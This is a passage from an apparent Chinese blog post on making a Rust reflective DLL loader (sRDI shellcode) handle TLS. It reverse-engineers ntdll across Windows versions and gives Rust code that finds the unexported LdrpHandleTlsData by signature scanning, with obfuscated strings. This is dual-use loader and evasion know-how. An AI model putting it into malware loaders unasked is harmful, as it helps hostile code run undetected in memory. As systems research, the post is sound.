class="hljs rust">.\loader_demo.exe<br>[+] will run!<br>Hello, world!<br></code></pre></td></tr></table></figure><p>成功了， 说明在有 <code>TLS</code> 的情况下，在相同编译器版本下， 简单的 <code>hello world</code> 程序是可以错误的正确执行的（没有输出 <code>run over~</code>是因为 <code>hello world</code> 调用了 <code>exit</code>)</p><p>现在我们成功的加载了 <code>hello world</code>, 但其实并没有解决根本问题， 比如纯<code>c</code>环境或复杂的 <code>rust</code>程序， 接下来让我们尝试在纯 <code>c</code> 环境中加载 <code>hello world</code></p><p>首先我们回到 <code>c</code> 的报错</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">fatal runtime error: global allocator may not use TLS<br></code></pre></td></tr></table></figure><p>首先我们需要知道的是， 我们的 <code>tls callback</code> 函数并不会做任何的 <code>tls</code> 初始化相关工作， 我们需要在其它地方寻找其踪迹， 我们漏了什么呢?</p><p>此时我想起之前看到的一个项目 <a href="https://github.com/paskalian/WID_LoadLibrary">WID_LoadLibrary</a> , 可以让我们很好的看清 <code>LoadLibrary</code>的具体流程（当然， 由于提供了符号表， 如果只关心流程的话直接看<code>ntdll</code> 也差不多），如果只看该项目的分析， 我们可以直接将关注点收缩到关键函数 <code>LdrpCallTlsInitializers</code></p><p>这里我以我本机环境为例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">&gt;ver<br>Microsoft Windows [版本 10.0.22631.4460]<br></code></pre></td></tr></table></figure><p>看看64位该函数的作用</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">LdrpCallTlsInitializers</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> a1, __int64 a2)</span></span><br><span class="hljs-function"></span>&#123;<br>  __int64 TlsEntry; <span class="hljs-comment">// rbx</span><br>  __int64 result; <span class="hljs-comment">// rax</span><br>  __int64 *v6; <span class="hljs-comment">// rbx</span><br>  __int64 v7; <span class="hljs-comment">// rdi</span><br><br>  <span class="hljs-built_in">RtlAcquireSRWLockShared</span>(&amp;LdrpTlsLock);<br>  TlsEntry = <span class="hljs-built_in">LdrpFindTlsEntry</span>(a2);<br>  result = <span class="hljs-built_in">RtlReleaseSRWLockShared</span>(&amp;LdrpTlsLock);<br>  <span class="hljs-keyword">if</span> ( TlsEntry )<br>  &#123;<br>    v6 = *(__int64 **)(TlsEntry + <span class="hljs-number">40</span>);<br>    <span class="hljs-keyword">if</span> ( v6 )<br>    &#123;<br>      <span class="hljs-keyword">while</span> ( <span class="hljs-number">1</span> )<br>      &#123;<br>        v7 = *v6;<br>        <span class="hljs-keyword">if</span> ( !*v6 )<br>          <span class="hljs-keyword">break</span>;<br>        ++v6;<br>        <span class="hljs-built_in">LdrpLogInternal</span>(<br>          (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-string">&quot;minkernel\\ntdll\\ldrtls.c&quot;</span>,<br>          <span class="hljs-number">1180</span>,<br>          (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)<span class="hljs-string">&quot;LdrpCallTlsInitializers&quot;</span>,<br>          <span class="hljs-number">2</span>,<br>          <span class="hljs-string">&quot;Calling TLS callback %p for DLL \&quot;%wZ\&quot; at %p\n&quot;</span>,<br>          v7,<br>          a2 + <span class="hljs-number">72</span>,<br>          *(_QWORD *)(a2 + <span class="hljs-number">48</span>));<br>        result = <span class="hljs-built_in">LdrpCallInitRoutine</span>(ImageTlsCallbackCaller, *(_QWORD *)(a2 + <span class="hljs-number">48</span>), a1, v7);<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到， 该函数在本版本中的调用十分清晰，通过调用<code>LdrpFindTlsEntry</code> 函数获取  <code>TlsEntry</code>， 随后遍历寻找其 <code>Tls callback</code>函数并调用</p><p>而这也就意味着还有一部分内容早就初始化好了，而项目中并未提及， 因此我们还是需要依赖 <code>ntdll</code>， 感谢微软对符号表的慷慨:)</p><p>当我们搜索 <code>ntdll</code>中和<code>tls</code>相关的函数时， 可以注意到几个之前从未提及的函数<code>LdrpInitializeTls</code>, <code>LdrpHandleTlsData</code> 以及 <code>LdrpAllocateTlsEntry</code></p><p><code>LdrpInitializeTls</code> 函数被 <code>LdrpInitializeProcess</code> 引用，也就是说其实在进程初始化时就已经初始化过<code>TLS</code>了， 我们后续 <code>SRDI</code> 出来的 <code>shellcode</code><br> 完全所使用的<code>tls_index</code>与之完全无关， 即使像之前 <code>hello world</code> 在 <code>rust</code> 环境中错误的正确执行了， 也是因为我们错误覆盖或使用了原本<code>rust</code>程序的<code>tls</code>环境</p><p>接下来 <code>LdrpHandleTlsData</code> 追根溯源则来自于 <code>LdrLoadDll</code>， 好的， 这应该就是我们需要重点关注的内容了</p><p>由于我们的纯 <code>c</code> 环境并没有隐式 <code>tls</code>， 因此也不会对其进行初始化和分配， 那么接下来需要做的， 就清晰明朗了许多</p><p>首先我们需要关注<code>LdrpInitializeTls</code>吗， 其实并不需要， 因为想象正常系统 <code>load dll</code> 的场景， 一个含有隐式 <code>tls</code> 的 <code>dll</code> 在使用 <code>LoadLibrary</code> 被加载进系统时是不会触发进程初始化的， 因此我们只需要关注在 <code>LdrLoadDll</code> 时调用的<code>LdrpHandleTlsData</code>即可， 而该函数签名如下:</p><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">type</span> <span class="hljs-title class_">LdrpHandleTlsData</span> = <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;system&quot;</span> <span class="hljs-title function_ invoke__">fn</span>(<br>    hmodule: *<span class="hljs-keyword">mut</span> ::core::ffi::c_void,<br>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span>;<br></code></pre></td></tr></table></figure><p>因此想要解决我们的问题， 有两条路线摆在我们面前:</p><ol><li>尝试调用该函数</li><li>尝试实现该函数</li></ol><p>由于 <code>LdrpHandleTlsData</code> 函数未导出， 因此我们需要想办法获取到该函数的地址并调用， 这也是开头提及的文章<a href="https://landaire.net/reflective-pe-loader-for-xbox/">Writing a PE Loader for the Xbox in 2024</a> 所完成的那样， 而由于 <code>windows</code> 版本非常多， 因此远远不够， 但还是有一些项目做了大量的适配， 例如 <a href="https://github.com/UnhappyAngel/Blackbone/blob/1a7d95567dc02fb1e5649a3d96f4aac36cac5427/src/BlackBone/Symbols/PatternLoader.cpp#L169">Blackbone</a> 还有 <a href="https://github.com/bb107/MemoryModulePP/blob/79f258b672f81c6ebbee1454335c4a4309d07ccb/MemoryModule/MmpLdrpTls.cpp#L23">MemoryModulePP</a></p><p>这几个项目都使用了通过硬编码特征来进行内存搜索的办法， 但前人的工作仿佛停在了 <code>Win11</code> 版本之前，而<code>Win11</code>也已经推出 <code>3</code> 年了， 需要去一一适配吗</p><p>如果各位经常写<code>exp</code>的话， 应该会经常遇到需要寻找全局变量或某些函数的需求， 比如 <code>chrome</code> 过沙箱需要设置的某<code>flag</code>， 虽然打开<code>ida</code> 很快就能做好适配， 但多个版本还是需要找一个共性</p><p>好在 <code>win11</code> 给了我们便利， 让我们仔细观察这几个函数， 可以注意到刚刚我给出的片段中有用于 <code>debug</code> 的日志信息， 那么我们是否可以通过<code>debug</code>信息定位函数呢， 首先我们可以注意到在<code>LdrpInitializeTls</code> 函数中的一个片段(以64位举例)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs asm">// ntdll version: 10.0.22000.120<br>.text:0000000180079CFD loc_180079CFD:                          ; CODE XREF: LdrpInitializeTls+D3↑j<br>.text:0000000180079CFD                 lea     rax, [rsi+48h]<br>.text:0000000180079D01                 mov     [rsp+88h+var_58], rbp<br>.text:0000000180079D06                 mov     [rsp+88h+var_60], rax<br>.text:0000000180079D0B                 lea     r8, aLdrpinitialize_5 ; &quot;LdrpInitializeTls&quot;<br>.text:0000000180079D12                 lea     rax, aDllWzHasTlsInf ; &quot;DLL \&quot;%wZ\&quot; has TLS information at %p\n&quot;<br>.text:0000000180079D19                 mov     r9d, 2<br>.text:0000000180079D1F                 mov     edx, 281h<br>.text:0000000180079D24                 mov     [rsp+88h+var_68], rax<br>.text:0000000180079D29                 lea     rcx, aMinkernelNtdll_2 ; &quot;minkernel\\ntdll\\ldrtls.c&quot;<br>.text:0000000180079D30                 call    LdrpLogInternal<br>.text:0000000180079D35                 xor     r9d, r9d<br>.text:0000000180079D38                 mov     [rsp+88h+var_68], r14<br>.text:0000000180079D3D                 lea     r8, [rsp+88h+var_48]<br>.text:0000000180079D42                 mov     rdx, rsi<br>.text:0000000180079D45                 mov     rcx, rbp<br>.text:0000000180079D48                 call    LdrpAllocateTlsEntry<br>.text:0000000180079D4D                 test    eax, eax<br>.text:0000000180079D4F                 js      short loc_180079CD5<br>.text:0000000180079D51                 mov     eax, 0FFFFh<br>.text:0000000180079D56                 mov     [rsi+6Eh], ax<br>.text:0000000180079D5A                 jmp     loc_180079CB1<br><br></code></pre></td></tr></table></figure><p>可以看到， 在该版本中， 只要找到 <code>LdrpInitializeTls</code> 的引用， 就能找到该片段的上下文， 而再观察一下附近的信息 <code>LdrpAllocateTlsEntry</code>,  只会在两个函数中被引用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">DirectionTypeAddressText<br>UppLdrpHandleTlsData+124call    LdrpAllocateTlsEntry<br>pLdrpInitializeTls+16Ccall    LdrpAllocateTlsEntry<br>Downo.rdata:0000000180152E08RUNTIME_FUNCTION &lt;rva LdrpAllocateTlsEntry, rva byte_180031153, \<br>Downo.pdata:000000018017F728RUNTIME_FUNCTION &lt;rva LdrpAllocateTlsEntry, rva byte_180031153, \<br></code></pre></td></tr></table></figure><p>而 <code>LdrpHandleTlsData</code> 恰巧是我们需要的， 再看看<code>LdrpHandleTlsData</code>函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000180033824 LdrpHandleTlsData proc near             ; CODE XREF: LdrpDoPostSnapWork+6F↓p<br>.text:0000000180033824                                         ; DATA XREF: .rdata:00000001801530F0↓o ...<br>.text:0000000180033824<br>...<br>.text:0000000180033945                 mov     rcx, r14<br>.text:0000000180033948                 call    LdrpAllocateTlsEntry<br>.text:000000018003394D                 mov     esi, eax<br>.text:000000018003394F                 mov     [rsp+108h+var_D4], eax<br></code></pre></td></tr></table></figure><p>很好， 只需要我们通过 <code>debug</code> 字符串特征反查到 <code>call LdrpAllocateTlsEntry</code> 的地方， 再通过扫描<code>.text</code> 段中对该地址的 <code>call rva</code> 的 <code>opcode</code>， 扫描到函数开头就能找到<code>LdrpHandleTlsData</code>了， 而由于对齐的原因， 函数开头前面会有 <code>CC CC CC</code>类的填充， 那么接下来的事情就非常容易了</p><h3 id="done"><a href="#done" class="headerlink" title="done!"></a>done!</h3><figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">pub</span> <span class="hljs-keyword">unsafe</span> <span class="hljs-keyword">fn</span> <span class="hljs-title function_">find_ldrp_handle_tls_data</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> &#123;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ntdll</span> = <span class="hljs-keyword">match</span> <span class="hljs-title function_ invoke__">GetModuleBaseAddr</span>(<br>        obfstr!(<span class="hljs-string">&quot;ntdll.dll&quot;</span>).<span class="hljs-title function_ invoke__">as_bytes</span>(), <br>        StrCmp::u16_u8_cmp<br>    ) &#123;<br>        <span class="hljs-title function_ invoke__">Ok</span>(addr) =&gt; addr,<br>        <span class="hljs-title function_ invoke__">Err</span>(_) =&gt; <span class="hljs-number">0</span> <span class="hljs-keyword">as</span> _<br>    &#125;; <br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s</span> = <span class="hljs-string">&quot;LdrpInitializeTls\x00&quot;</span>.<span class="hljs-title function_ invoke__">as_bytes</span>();<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">pe</span> = <span class="hljs-keyword">match</span> crate::pe::PE::PE::<span class="hljs-title function_ invoke__">new_unchecked</span>(ntdll) &#123;<br>        <span class="hljs-title function_ invoke__">Some</span>(pe) =&gt; pe,<br>        <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    &#125;;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">s_addr</span> = <span class="hljs-keyword">match</span> pe.<span class="hljs-title function_ invoke__">find_string_in_rdata</span>(s) &#123;<br>        <span class="hljs-title function_ invoke__">Some</span>(addr) =&gt; addr,<br>        <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    &#125;;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] s_addr is &#123;:x&#125;&quot;</span>, s_addr);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">xref_addr</span> = <span class="hljs-keyword">match</span> pe.<span class="hljs-title function_ invoke__">find_xref_in_text</span>(<span class="hljs-string">b&quot;\x4C\x8d\x05&quot;</span>, <span class="hljs-number">7</span>, s_addr) &#123;<br>        <span class="hljs-title function_ invoke__">Some</span>(addr) =&gt; addr + ntdll <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>,<br>        <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    &#125;;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;xref_addr is &#123;:x&#125;&quot;</span>, xref_addr);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">call_drp_log_internal_addr</span> = <br>        <span class="hljs-keyword">match</span> <span class="hljs-title function_ invoke__">find_str</span>(xref_addr <span class="hljs-keyword">as</span> _, <span class="hljs-number">0x30</span>, <span class="hljs-string">b&quot;\xE8&quot;</span>) &#123;<br>            <span class="hljs-title function_ invoke__">Some</span>(addr) =&gt; addr + xref_addr,<br>            <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    &#125;;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] call_drp_log_internal_addr is &#123;:x&#125;&quot;</span><br>        , call_drp_log_internal_addr);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">call_ldr_allocate_tls_entry</span> = <span class="hljs-keyword">match</span> <span class="hljs-title function_ invoke__">find_str</span>(<br>            (call_drp_log_internal_addr + <span class="hljs-number">5</span>) <span class="hljs-keyword">as</span> _, <br>            <span class="hljs-number">0x30</span>, <br>            <span class="hljs-string">b&quot;\xE8&quot;</span>) &#123;<br>        <span class="hljs-title function_ invoke__">Some</span>(addr) =&gt; addr + call_drp_log_internal_addr + <span class="hljs-number">5</span>,<br>        <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    &#125;;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] call_ldr_allocate_tls_entry is &#123;:x&#125;&quot;</span>, <br>        call_ldr_allocate_tls_entry);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ldr_allocate_tls_entry</span> = call_ldr_allocate_tls_entry + <br>        <span class="hljs-title function_ invoke__">calc_call_rva</span>(call_ldr_allocate_tls_entry <span class="hljs-keyword">as</span> _) <span class="hljs-keyword">as</span> <span class="hljs-type">usize</span>;<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">black_list</span>: [<span class="hljs-type">usize</span>;<span class="hljs-number">1</span>] = [call_ldr_allocate_tls_entry];<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">call_ldr_allocate_tls_entry2</span> = <br>        <span class="hljs-keyword">match</span> pe.<span class="hljs-title function_ invoke__">find_call_rva_in_text</span>(ldr_allocate_tls_entry, &amp;black_list) &#123;<br>            <span class="hljs-title function_ invoke__">Some</span>(addr) =&gt; addr,<br>            <span class="hljs-literal">None</span> =&gt; &#123; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>; &#125;<br>    &#125;;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] call_ldr_allocate_tls_entry2 is &#123;:x&#125;&quot;</span>, <br>        call_ldr_allocate_tls_entry2);<br>    <span class="hljs-keyword">let</span> <span class="hljs-variable">ldrp_handle_tls_data</span> = <br>        <span class="hljs-keyword">match</span> pe.<span class="hljs-title function_ invoke__">find_func_start</span>(call_ldr_allocate_tls_entry2) &#123;<br>            <span class="hljs-title function_ invoke__">Some</span>(addr) =&gt; addr,<br>            <span class="hljs-literal">None</span> =&gt; <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br>    &#125;;<br>    <span class="hljs-built_in">println!</span>(<span class="hljs-string">&quot;[+] ldrp handle tls data is &#123;:x&#125;&quot;</span>, ldrp_handle_tls_data);<br>    <span class="hljs-keyword">return</span> ldrp_handle_tls_data;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>再看看测试机的版本<code>10.0.22631.4602</code>， 也一样可以通过该方法进行寻找， 那么是否可以替换前面的那一大票内容呢</p><p>很可惜， 我先是信心满满的下载了测试机 <code>win7(ver: 6.1.7600)</code> 的 <code>ntdll</code>， </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000078EF09D0 loc_78EF09D0:                           ; CODE XREF: LdrpInitializeTls+99↑j<br>.text:0000000078EF09D0                                         ; DATA XREF: .pdata:0000000078F9E1BC↓o<br>.text:0000000078EF09D0                 mov     rsi, [rsp+88h+Src]<br>.text:0000000078EF09D8                 test    rsi, rsi<br>.text:0000000078EF09DB                 jz      loc_78E994A7<br>.text:0000000078EF09E1                 test    byte ptr cs:LdrpDebugFlags, 5<br>.text:0000000078EF09E8                 jz      short loc_78EF0A1B<br>.text:0000000078EF09EA                 lea     rax, [rdi+48h]<br>.text:0000000078EF09EE                 mov     [rsp+88h+var_58], rsi<br>.text:0000000078EF09F3                 lea     r8, aLdrpinitialize_1 ; &quot;LdrpInitializeTls&quot;<br>.text:0000000078EF09FA                 mov     [rsp+88h+var_60], rax<br>.text:0000000078EF09FF                 lea     rcx, aDW7rtmMinkerne_15 ; &quot;d:\\w7rtm\\minkernel\\ntdll\\ldrtls.c&quot;<br>.text:0000000078EF0A06                 mov     r9d, 2<br>.text:0000000078EF0A0C                 mov     edx, 23Fh<br>.text:0000000078EF0A11                 mov     [rsp+88h+var_68], r15<br>.text:0000000078EF0A16                 call    LdrpLogDbgPrint<br>.text:0000000078EF0A1B<br>.text:0000000078EF0A1B loc_78EF0A1B:                           ; CODE XREF: LdrpInitializeTls+575E8↑j<br>.text:0000000078EF0A1B                 test    bpl, bpl<br>.text:0000000078EF0A1E                 jz      short loc_78EF0A21<br>.text:0000000078EF0A20                 int     3               ; Trap to Debugger<br>.text:0000000078EF0A21<br>.text:0000000078EF0A21 loc_78EF0A21:                           ; CODE XREF: LdrpInitializeTls+5761E↑j<br>.text:0000000078EF0A21                 lea     r8, [rsp+88h+arg_0]<br>.text:0000000078EF0A29                 xor     r9d, r9d<br>.text:0000000078EF0A2C                 mov     rdx, rdi<br>.text:0000000078EF0A2F                 mov     rcx, rsi        ; Src<br>.text:0000000078EF0A32                 mov     [rsp+88h+var_68], rbp ; __int64<br>.text:0000000078EF0A37                 call    LdrpAllocateTlsEntry<br>.text:0000000078EF0A3C                 test    eax, eax<br>.text:0000000078EF0A3E                 js      loc_78E994CD<br>.text:0000000078EF0A44                 mov     [rdi+6Eh], r14w<br>.text:0000000078EF0A49                 jmp     loc_78E994A7<br>.text:0000000078EF0A4E ; ---------------------------------------------------------------------------<br></code></pre></td></tr></table></figure><p>很好， 再看看 <code>LdrpHandleTlsData</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000078E8D030 ; __unwind &#123; // __C_specific_handler<br>...<br>.text:0000000078E8D07C                 jns     loc_78EF1CC6<br>.text:0000000078E8D082<br>.text:0000000078E8D082 loc_78E8D082:                           ; CODE XREF: LdrpHandleTlsData+64C9C↓j<br>.text:0000000078E8D082                 xor     eax, eax<br>.text:0000000078E8D084<br>...<br>.text:0000000078E8D096                 retn<br>.text:0000000078E8D096 ; ---------------------------------------------------------------------------<br>.text:0000000078E8D097                 align 20h<br>.text:0000000078E8D097 ; &#125; // starts at 78E8D030<br>.text:0000000078E8D097 LdrpHandleTlsData endp<br></code></pre></td></tr></table></figure><p>完了， 其向下跳转到下方的 <code>function chunk</code> 中了， 好的， 异常解析</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:0000000078EF1CC6 loc_78EF1CC6:                           ; CODE XREF: LdrpHandleTlsData+4C↑j<br>.text:0000000078EF1CC6                                         ; DATA XREF: .pdata:0000000078F9E408↓o ...<br>...<br>.text:0000000078EF1DCF                 mov     rdx, rbx<br>.text:0000000078EF1DD2                 mov     rcx, [rsp+0D8h+Size] ; Src<br>.text:0000000078EF1DD7                 call    LdrpAllocateTlsEntry<br></code></pre></td></tr></table></figure><p>这种情况自然也是可以解决的， 仔细观察可以发现这段跳转被 <code>.pdata</code> 段引用， 那么只需要判断其位置是否在<code>.pdata</code>段的异常表中， 并解析<code>RUNTIME_FUNCTION</code>就可以找到我们的<code>LdrpHandleTlsData</code> 函数了， <code>win7</code> 如此， 其它版本呢， 让我们下载一个 <code>win8</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00000001800AC1FE ; START OF FUNCTION CHUNK FOR LdrpInitializeTls<br>.text:00000001800AC1FE<br>.text:00000001800AC1FE loc_1800AC1FE:                          ; CODE XREF: LdrpInitializeTls+A4↑j<br>.text:00000001800AC1FE                                         ; DATA XREF: .pdata:0000000180139860↓o<br>.text:00000001800AC1FE                 mov     [rsp+68h+var_38], rax<br>.text:00000001800AC203                 lea     rcx, [rdi+48h]<br>.text:00000001800AC207                 lea     rax, aDllWzHasTlsInf ; &quot;DLL \&quot;%wZ\&quot; has TLS information at %p\n&quot;<br>.text:00000001800AC20E                 mov     [rsp+68h+var_40], rcx<br>.text:00000001800AC213                 lea     r8, aLdrpinitialize_5 ; &quot;LdrpInitializeTls&quot;<br>.text:00000001800AC21A                 lea     rcx, aMinkernelNtdll_6 ; &quot;minkernel\\ntdll\\ldrtls.c&quot;<br>.text:00000001800AC221                 mov     r9d, 2<br>.text:00000001800AC227                 mov     edx, 242h<br>.text:00000001800AC22C                 mov     [rsp+68h+var_48], rax<br>.text:00000001800AC231                 call    LdrpLogDbgPrint<br>.text:00000001800AC236                 nop<br>.text:00000001800AC237                 jmp     loc_1800270B6<br>.text:00000001800AC23C ; ---------------------------------------------------------------------------<br>.text:00000001800AC23C<br>.text:00000001800AC23C loc_1800AC23C:                          ; CODE XREF: LdrpInitializeTls+DC↑j<br>...<br></code></pre></td></tr></table></figure><p>又不一样了， 好在 <code>LdrpHandleTlsData</code> 是一样的， 不需要再处理了</p><p>这里可以发现其通过再一次跳转才会到我们的<code>LdrpAllocateTlsEntry</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asm">.text:00000001800270B6 loc_1800270B6:                          ; CODE XREF: LdrpInitializeTls+8522B↓j<br>.text:00000001800270B6                 test    bpl, bpl<br>.text:00000001800270B9                 jnz     short loc_180027137<br>.text:00000001800270BB<br>.text:00000001800270BB loc_1800270BB:                          ; CODE XREF: LdrpInitializeTls+12C↓j<br>.text:00000001800270BB                 lea     r8, [rsp+68h+arg_0]<br>.text:00000001800270C0                 xor     r9d, r9d<br>.text:00000001800270C3                 mov     rdx, rdi<br>.text:00000001800270C6                 mov     rcx, rsi<br>.text:00000001800270C9                 mov     [rsp+68h+var_48], rbp<br>.text:00000001800270CE                 call    LdrpAllocateTlsEntry<br>.text:00000001800270D3                 test    eax, eax<br>.text:00000001800270D5                 js      short loc_18002709E<br>.text:00000001800270D7                 mov     eax, 0FFFFh<br>.text:00000001800270DC                 mov     [rdi+6Eh], ax<br>.text:00000001800270E0                 jmp     short loc_18002707F<br></code></pre></td></tr></table></figure><p>再试几个版本， 均是这样， 那么基本可以用这种方式确定了</p><p>先查找 <code>LdrpInitializeTls</code> 字符串的引用， 找到 <code>LdrpLogDbgPrint</code> 函数后判断其下方指令是否为<code>nop; jmp rva</code>， 是就跟随过去寻找 